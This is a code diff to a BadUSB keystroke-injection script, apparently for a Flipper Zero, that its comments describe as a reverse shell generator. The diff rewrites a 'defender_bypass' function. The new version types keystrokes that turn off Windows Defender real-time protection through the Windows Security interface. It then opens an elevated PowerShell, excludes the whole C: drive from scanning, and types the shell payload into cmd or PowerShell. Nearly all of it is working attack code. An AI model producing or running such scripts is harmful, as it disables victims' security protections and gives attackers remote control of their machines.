@@ -2,6 +2,8 @@
 // This script will generate a reverse shell for you, asking for the IP and Port to connect to as well as
 // the type of shell you want to generate and if you need to open a terminal window before sending the payload.
 // shoutout to @jamisonderek for the speaker api.
+// Please note that on windows 11, the defender will actively block the payload, windows 10 however will not on
+// the default settings.
 // OS Supported: Linux, Mac, Windows
 //
 // At this stage I'm figuring out a way to bypass the Windows Defender and send a powershell payload.   
@@ -191,33 +193,66 @@ notify.blink("blue", "short");
 chest_open();
 
 function defender_bypass() {
-    print("disabling defender...");
-    badusb.press("GUI", "r");
+    delay(1500);
+    badusb.press("CTRL", "ESC");
+    delay(750);
+    badusb.print("windows security");
+    delay(1000);
+    badusb.press("ENTER");
+    delay(1000);
+    badusb.press("ENTER");
     delay(500);
-    badusb.println("powershell", 10);
+    badusb.press("TAB");
+    delay(100);
+    badusb.press("TAB");
+    delay(100);
+    badusb.press("TAB");
+    delay(100);
+    badusb.press("TAB");
+    delay(100);
+    badusb.press("TAB");
+    delay(100);
+    badusb.press("ENTER");
     delay(500);
-    badusb.println("Set-MpPreference -DisableRealtimeMonitoring $true", 10);
-    delay(500);
+    badusb.press("SPACE");
+    delay(1000);
+    badusb.press("ALT", "y");
+    delay(1000);
     badusb.press("ALT", "F4");
     delay(500);
+    badusb.press("GUI", "r");
+    delay(500);
+    badusb.print("powershell");
+    badusb.press("CTRL", "SHIFT", "ENTER");
+    delay(1000);
+    badusb.press("TAB");
+    delay(100);
+    badusb.press("TAB");
+    delay(200);
+    badusb.press("ENTER");
+    delay(1000);
+    badusb.print("Add-MpPreference -ExclusionPath \"C:\"");
+    badusb.press("ENTER");
+    delay(2000);
+    badusb.print("EXIT");
+    badusb.press("ENTER");
 }
 
 if (shellType === 6 || shellType === 7) {
     if (disableDefender === 0) {defender_bypass();}
     print("sending powershell payload...");
     badusb.press("GUI", "r");
-    delay(500);
+    delay(1000);
     badusb.println("cmd", 10);
     delay(1000);
     badusb.println(command, 10);
-    delay(500);
 } else if (shellType === 5) {
     if (disableDefender === 0) {defender_bypass();}
     print("sending powershell payload...");
     badusb.press("GUI", "x");
     delay(300);
     badusb.press("i");
-    delay(3000);
+    delay(2000);
     badusb.println(command, 10);
 } else {
 
